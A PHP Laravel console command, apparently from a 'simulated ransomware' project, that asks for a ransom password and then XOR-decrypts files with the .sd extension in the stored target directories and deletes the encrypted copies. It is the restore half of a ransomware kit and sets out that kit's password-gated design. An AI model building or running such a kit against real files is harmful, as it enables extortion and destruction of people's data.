<?php

namespace App\Console\Commands;

use Illuminate\Console\Command;
use Illuminate\Support\Facades\File;

class UnlockApp extends Command
{
    protected $signature = 'ransom:unlock {password?}';
    protected $description = 'Buka semua file .sd hasil ransomware simulasi';

    public function handle()
    {
        $input = $this->argument('password') ?? $this->ask('Password tebusan');

        $realPass = trim(file_get_contents(storage_path('app/.ransom_pass')));

        if ($input !== $realPass) {
            $this->error('Password salah!');
            return;
        }

        $key = file_get_contents(storage_path('app/.ransom_key'));
        $targets = json_decode(file_get_contents(storage_path('app/.ransom_target')), true);
        $count = 0;

        foreach ($targets as $dir) {
            if (!is_dir($dir)) continue;

            $iterator = new \RecursiveIteratorIterator(
                new \RecursiveDirectoryIterator($dir, \RecursiveDirectoryIterator::SKIP_DOTS)
            );

            foreach ($iterator as $file) {
                if ($file->getExtension() !== 'sd') continue;

                $path = $file->getPathname();
                $enc = file_get_contents($path);
                $raw = base64_decode($enc);

                $keyPart = substr(str_repeat($key, ceil(strlen($raw) / strlen($key))), 0, strlen($raw));
                $dec = $raw ^ $keyPart;

                $orig = preg_replace('/\.sd$/', '', $path);

                file_put_contents($orig, $dec);
                unlink($path);

                $this->line("Restored: " . basename($orig));
                $count++;
            }
        }

        $this->info("SUKSES! $count file berhasil dikembalikan.");
    }
}
